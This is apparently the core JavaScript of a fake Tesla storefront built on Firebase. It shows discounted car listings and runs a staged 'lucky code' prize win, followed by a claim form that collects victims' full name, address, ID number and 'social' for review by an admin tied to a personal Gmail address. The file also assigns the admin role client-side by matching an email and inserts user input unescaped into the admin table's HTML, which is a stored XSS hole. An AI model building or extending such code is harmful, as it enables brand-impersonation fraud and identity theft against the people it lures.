// ============================================================
//  main.js  –  Tesla Site Core Logic
//  Uses Firebase Modular SDK (v10) via CDN imports in HTML
// ============================================================

import { auth, db } from './firebase-config.js';

import {
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
  signOut,
  onAuthStateChanged
} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";

import {
  doc, setDoc, getDoc, getDocs, addDoc,
  collection, query, orderBy, updateDoc, serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

// ── Constants ─────────────────────────────────────────────────
const ADMIN_EMAIL  = 'Solokumo05@gmail.com';
const LUCKY_CODE   = 'SPE-87698432FZ';
const LOADER_MS    = 8000;

export const MODELS = [
  {
    id: 'model3',
    name: 'Model 3',
    tagline: 'The car of the future, today.',
    price: 40240,
    range: '358 mi',
    topSpeed: '162 mph',
    acceleration: '3.1s',
    img: 'https://images.unsplash.com/photo-1561580125-028ee3bd62eb?w=900&q=80',
  },
  {
    id: 'modely',
    name: 'Model Y',
    tagline: 'Most versatile SUV ever made.',
    price: 43990,
    range: '330 mi',
    topSpeed: '155 mph',
    acceleration: '3.5s',
    img: 'https://images.unsplash.com/photo-1619767886558-efdc259cde1a?w=900&q=80',
  },
  {
    id: 'models',
    name: 'Model S',
    tagline: 'The pinnacle of performance.',
    price: 74990,
    range: '405 mi',
    topSpeed: '200 mph',
    acceleration: '1.99s',
    img: 'https://images.unsplash.com/photo-1617788138017-80ad40651399?w=900&q=80',
  },
  {
    id: 'modelx',
    name: 'Model X',
    tagline: 'Unmatched utility & performance.',
    price: 79990,
    range: '348 mi',
    topSpeed: '163 mph',
    acceleration: '2.5s',
    img: 'https://images.unsplash.com/photo-1560958089-b8a1929cea89?w=900&q=80',
  },
  {
    id: 'cybertruck',
    name: 'Cybertruck',
    tagline: 'Built for the future.',
    price: 99990,
    range: '340 mi',
    topSpeed: '130 mph',
    acceleration: '2.6s',
    img: 'https://images.unsplash.com/photo-1692630083714-da8e4fc29b3d?w=900&q=80',
  },
];

// ── Helpers ───────────────────────────────────────────────────
export function getDiscount(pct = 20) { return pct / 100; }

export function applyDiscount(price, pct = 20) {
  return Math.round(price * (1 - pct / 100));
}

export function formatUSD(n) {
  return '$' + n.toLocaleString('en-US');
}

export function calcFinance(price) {
  let down;
  if (price < 40000)        down = 3000;
  else if (price < 80000)   down = 6000;
  else if (price < 100000)  down = 9000;
  else                      down = 12000;
  const loan     = price - down;
  const rate     = 0.0599 / 12;
  const months   = 72;
  const monthly  = Math.round(loan * rate / (1 - Math.pow(1 + rate, -months)));
  return { down, monthly };
}

function generateOrderCode() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let code = 'ORD-';
  for (let i = 0; i < 12; i++) {
    if (i === 4 || i === 8) code += '-';
    code += chars[Math.floor(Math.random() * chars.length)];
  }
  return code;
}

function showToast(msg, type = 'info') {
  let t = document.getElementById('toast');
  if (!t) {
    t = document.createElement('div');
    t.id = 'toast';
    t.style.cssText = `
      position:fixed; bottom:1.5rem; right:1.5rem; z-index:9999;
      padding:.75rem 1.5rem; border-radius:6px;
      font-size:.85rem; font-weight:600; letter-spacing:.05em;
      box-shadow: 0 8px 32px rgba(0,0,0,.4);
      transition: opacity .3s; font-family:'Outfit',sans-serif;
    `;
    document.body.appendChild(t);
  }
  t.textContent = msg;
  t.style.background = type === 'error' ? '#e31937' : type === 'success' ? '#16a34a' : '#1f2937';
  t.style.color = '#fff';
  t.style.opacity = '1';
  clearTimeout(t._timer);
  t._timer = setTimeout(() => { t.style.opacity = '0'; }, 3500);
}

// ── Nav scroll effect ─────────────────────────────────────────
export function initNav() {
  const nav = document.getElementById('navbar');
  if (!nav) return;
  window.addEventListener('scroll', () => {
    nav.classList.toggle('scrolled', window.scrollY > 20);
  });

  // Auth-aware nav
  onAuthStateChanged(auth, user => {
    const logoutBtn = document.getElementById('nav-logout');
    const loginLink = document.getElementById('nav-login');
    const dashLink  = document.getElementById('nav-dash');
    if (user) {
      if (loginLink) loginLink.style.display = 'none';
      if (logoutBtn) logoutBtn.style.display = 'inline-flex';
      if (dashLink)  dashLink.style.display  = 'inline-flex';
    } else {
      if (loginLink) loginLink.style.display = 'inline-flex';
      if (logoutBtn) logoutBtn.style.display = 'none';
      if (dashLink)  dashLink.style.display  = 'none';
    }
  });

  document.getElementById('nav-logout')?.addEventListener('click', async () => {
    await signOut(auth);
    window.location.href = 'login.html';
  });
}

// ── Register page ─────────────────────────────────────────────
export async function initRegister() {
  const form = document.getElementById('register-form');
  if (!form) return;
  form.addEventListener('submit', async e => {
    e.preventDefault();
    clearErrors();
    const name     = document.getElementById('reg-name').value.trim();
    const email    = document.getElementById('reg-email').value.trim();
    const phone    = document.getElementById('reg-phone').value.trim();
    const password = document.getElementById('reg-password').value;
    let valid = true;

    if (!name)     { setError('err-name', 'Name is required'); valid = false; }
    if (!email)    { setError('err-email', 'Email is required'); valid = false; }
    if (!phone)    { setError('err-phone', 'Phone is required'); valid = false; }
    if (password.length < 6) { setError('err-password', 'Min 6 characters'); valid = false; }
    if (!valid) return;

    const btn = form.querySelector('button[type=submit]');
    btn.disabled = true; btn.textContent = 'Creating account…';

    try {
      const { user } = await createUserWithEmailAndPassword(auth, email, password);
      await setDoc(doc(db, 'users', user.uid), {
        name, email, phone,
        role: email === ADMIN_EMAIL ? 'admin' : 'user',
        createdAt: serverTimestamp()
      });
      showToast('Account created! Redirecting…', 'success');
      setTimeout(() => { window.location.href = 'login.html'; }, 1500);
    } catch (err) {
      setError('err-email', firebaseError(err.code));
      btn.disabled = false; btn.textContent = 'Create Account';
    }
  });
}

// ── Login page ────────────────────────────────────────────────
export async function initLogin() {
  const form = document.getElementById('login-form');
  if (!form) return;
  form.addEventListener('submit', async e => {
    e.preventDefault();
    clearErrors();
    const email    = document.getElementById('login-email').value.trim();
    const password = document.getElementById('login-password').value;

    const btn = form.querySelector('button[type=submit]');
    btn.disabled = true; btn.textContent = 'Signing in…';

    try {
      const { user } = await signInWithEmailAndPassword(auth, email, password);
      const snap = await getDoc(doc(db, 'users', user.uid));
      const role = snap.exists() ? snap.data().role : 'user';
      showToast('Welcome back!', 'success');
      setTimeout(() => {
        window.location.href = role === 'admin' ? 'admin.html' : 'dashboard.html';
      }, 1000);
    } catch (err) {
      setError('err-login', firebaseError(err.code));
      btn.disabled = false; btn.textContent = 'Sign In';
    }
  });
}

// ── Shop / Inventory page ─────────────────────────────────────
export async function initShop() {
  const grid = document.getElementById('inventory-grid');
  if (!grid) return;

  // Fetch admin discount from Firestore (fallback 20)
  let discountPct = 20;
  try {
    const settingsSnap = await getDoc(doc(db, 'settings', 'global'));
    if (settingsSnap.exists()) discountPct = settingsSnap.data().discountPct ?? 20;
  } catch (_) {}

  grid.innerHTML = MODELS.map(m => {
    const discounted = applyDiscount(m.price, discountPct);
    const saved      = m.price - discounted;
    const { monthly } = calcFinance(discounted);
    return `
      <div class="card fade-up">
        <div class="card-img">
          <img src="${m.img}" alt="${m.name}" loading="lazy"/>
        </div>
        <div class="card-body">
          <span class="card-badge">Save ${discountPct}%</span>
          <div class="card-title">${m.name}</div>
          <div class="text-gray" style="font-size:.8rem;margin:.25rem 0 .75rem;">${m.tagline}</div>
          <div class="price-original">${formatUSD(m.price)}</div>
          <div class="price-now">${formatUSD(discounted)}</div>
          <div class="price-save">Reduced by ${formatUSD(saved)}</div>
          <div class="price-finance">Est. financing from ${formatUSD(monthly)}/mo</div>
          <div style="display:flex;gap:.5rem;margin-top:1rem;">
            <a href="product.html?id=${m.id}" class="btn btn-white w-full" style="flex:1;">Order Now</a>
            <a href="product.html?id=${m.id}" class="btn btn-dark" style="flex:1;">Details</a>
          </div>
        </div>
      </div>`;
  }).join('');
}

// ── Product Detail page ───────────────────────────────────────
export async function initProduct() {
  const params = new URLSearchParams(window.location.search);
  const id     = params.get('id');
  const model  = MODELS.find(m => m.id === id);
  if (!model) { window.location.href = 'shop.html'; return; }

  let discountPct = 20;
  try {
    const snap = await getDoc(doc(db, 'settings', 'global'));
    if (snap.exists()) discountPct = snap.data().discountPct ?? 20;
  } catch (_) {}

  const discounted = applyDiscount(model.price, discountPct);
  const saved      = model.price - discounted;
  const { down, monthly } = calcFinance(discounted);

  document.getElementById('product-name').textContent   = model.name;
  document.getElementById('product-tagline').textContent = model.tagline;
  document.getElementById('product-img').src            = model.img;
  document.getElementById('product-range').textContent  = model.range;
  document.getElementById('product-speed').textContent  = model.topSpeed;
  document.getElementById('product-accel').textContent  = model.acceleration;

  // ── Tab switching
  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      document.querySelectorAll('.tab-panel').forEach(p => p.classList.add('hidden'));
      btn.classList.add('active');
      document.getElementById('tab-' + btn.dataset.tab).classList.remove('hidden');
    });
  });

  // ── Cash tab
  document.getElementById('cash-price').textContent    = formatUSD(discounted);
  document.getElementById('cash-original').textContent = formatUSD(model.price);
  document.getElementById('cash-saved').textContent    = formatUSD(saved);

  // ── Finance tab
  document.getElementById('fin-price').textContent   = formatUSD(discounted);
  document.getElementById('fin-down').textContent    = formatUSD(down);
  document.getElementById('fin-monthly').textContent = formatUSD(monthly);

  // ── Lease tab
  const leaseMo = Math.round(discounted * 0.012);
  document.getElementById('lease-monthly').textContent = formatUSD(leaseMo);
  document.getElementById('lease-down').textContent    = formatUSD(Math.round(down * 0.8));

  // ── FSD Toggle
  const fsdToggle = document.getElementById('fsd-toggle');
  const fsdRow    = document.getElementById('fsd-summary');
  fsdToggle?.addEventListener('change', () => {
    if (fsdRow) fsdRow.textContent = fsdToggle.checked ? '+$99/mo FSD included' : '';
  });
}

// ── Lucky Number / Prize flow ─────────────────────────────────
export function initLucky() {
  const form       = document.getElementById('lucky-form');
  const loaderScr  = document.getElementById('loader-screen');
  const winnerScr  = document.getElementById('winner-screen');
  const normalScr  = document.getElementById('lucky-screen');
  if (!form) return;

  form.addEventListener('submit', async e => {
    e.preventDefault();
    const code = document.getElementById('lucky-input').value.trim().toUpperCase();
    if (code !== LUCKY_CODE) {
      setError('err-lucky', 'Invalid reference code. Please try again.');
      return;
    }
    // Show loader
    normalScr.classList.add('hidden');
    loaderScr.classList.remove('hidden');

    await new Promise(r => setTimeout(r, LOADER_MS));

    loaderScr.classList.add('hidden');
    winnerScr.classList.remove('hidden');
  });
}

// ── Prize Form submission ─────────────────────────────────────
export async function initPrizeForm() {
  const form = document.getElementById('prize-form');
  if (!form) return;

  onAuthStateChanged(auth, user => {
    if (!user) { window.location.href = 'login.html'; }
  });

  form.addEventListener('submit', async e => {
    e.preventDefault();
    const user = auth.currentUser;
    if (!user) { showToast('Please log in first', 'error'); return; }

    const fullName    = document.getElementById('prize-name').value.trim();
    const address     = document.getElementById('prize-address').value.trim();
    const idNumber    = document.getElementById('prize-id').value.trim();
    const social      = document.getElementById('prize-social').value.trim();
    const orderCode   = generateOrderCode();

    const btn = form.querySelector('button[type=submit]');
    btn.disabled = true; btn.textContent = 'Submitting…';

    try {
      await addDoc(collection(db, 'prizeClaims'), {
        uid: user.uid, email: user.email,
        fullName, address, idNumber, social,
        orderCode, status: 'pending',
        submittedAt: serverTimestamp()
      });
      await setDoc(doc(db, 'users', user.uid), { orderCode, prizeStatus: 'pending' }, { merge: true });

      document.getElementById('prize-form-wrap').classList.add('hidden');
      const success = document.getElementById('prize-success');
      document.getElementById('prize-order-code').textContent = orderCode;
      success.classList.remove('hidden');
    } catch (err) {
      showToast('Submission failed. Try again.', 'error');
      btn.disabled = false; btn.textContent = 'Submit Claim';
    }
  });
}

// ── User Dashboard ────────────────────────────────────────────
export async function initDashboard() {
  onAuthStateChanged(auth, async user => {
    if (!user) { window.location.href = 'login.html'; return; }
    const snap = await getDoc(doc(db, 'users', user.uid));
    const data = snap.exists() ? snap.data() : {};

    document.getElementById('dash-name').textContent  = data.name  || user.email;
    document.getElementById('dash-email').textContent = data.email || user.email;
    document.getElementById('dash-phone').textContent = data.phone || '—';

    const orderWrap = document.getElementById('dash-order-wrap');
    const noOrder   = document.getElementById('dash-no-order');
    if (data.orderCode) {
      document.getElementById('dash-order-code').textContent  = data.orderCode;
      document.getElementById('dash-order-status').textContent = data.prizeStatus || 'pending';
      orderWrap.classList.remove('hidden');
      noOrder.classList.add('hidden');
    } else {
      orderWrap.classList.add('hidden');
      noOrder.classList.remove('hidden');
    }
  });
}

// ── Admin Dashboard ───────────────────────────────────────────
export async function initAdmin() {
  onAuthStateChanged(auth, async user => {
    if (!user || user.email !== ADMIN_EMAIL) {
      window.location.href = 'login.html'; return;
    }

    // Load claims
    const claimsSnap = await getDocs(query(collection(db, 'prizeClaims'), orderBy('submittedAt', 'desc')));
    const tbody = document.getElementById('claims-tbody');
    if (tbody) {
      tbody.innerHTML = '';
      claimsSnap.forEach(d => {
        const c = d.data();
        const date = c.submittedAt?.toDate().toLocaleDateString() || '—';
        const badgeClass = c.status === 'approved' ? 'badge-green' : c.status === 'rejected' ? 'badge-red' : 'badge-yellow';
        tbody.innerHTML += `
          <tr>
            <td>${c.fullName}</td>
            <td>${c.email}</td>
            <td><code>${c.orderCode}</code></td>
            <td>${date}</td>
            <td><span class="badge ${badgeClass}">${c.status}</span></td>
            <td>
              <button class="btn btn-dark" style="padding:.3rem .7rem;font-size:.7rem;"
                onclick="adminAction('${d.id}','approved')">Approve</button>
              <button class="btn btn-red" style="padding:.3rem .7rem;font-size:.7rem;margin-left:.25rem;"
                onclick="adminAction('${d.id}','rejected')">Reject</button>
            </td>
          </tr>`;
      });
      if (claimsSnap.empty) tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--gray-400)">No claims yet.</td></tr>';
    }

    // Stats
    document.getElementById('stat-claims').textContent = claimsSnap.size;

    // Discount setting
    const settingsSnap = await getDoc(doc(db, 'settings', 'global'));
    const currentDisc  = settingsSnap.exists() ? (settingsSnap.data().discountPct ?? 20) : 20;
    const discInput    = document.getElementById('admin-discount');
    if (discInput) discInput.value = currentDisc;

    document.getElementById('save-discount')?.addEventListener('click', async () => {
      const val = parseInt(discInput.value);
      if (isNaN(val) || val < 1 || val > 80) { showToast('Enter 1–80', 'error'); return; }
      await setDoc(doc(db, 'settings', 'global'), { discountPct: val }, { merge: true });
      showToast('Discount updated to ' + val + '%', 'success');
    });
  });
}

// Exposed to inline onclick in admin table
window.adminAction = async (claimId, status) => {
  await updateDoc(doc(db, 'prizeClaims', claimId), { status });
  showToast('Status updated to: ' + status, 'success');
  setTimeout(() => location.reload(), 1000);
};

// ── Error helpers ─────────────────────────────────────────────
function setError(id, msg) {
  const el = document.getElementById(id);
  if (el) el.textContent = msg;
}
function clearErrors() {
  document.querySelectorAll('.form-error').forEach(el => el.textContent = '');
}
function firebaseError(code) {
  const map = {
    'auth/email-already-in-use': 'This email is already registered.',
    'auth/invalid-email':        'Invalid email address.',
    'auth/wrong-password':       'Incorrect password.',
    'auth/user-not-found':       'No account found with this email.',
    'auth/weak-password':        'Password must be at least 6 characters.',
    'auth/invalid-credential':   'Invalid email or password.',
  };
  return map[code] || 'Something went wrong. Try again.';
}
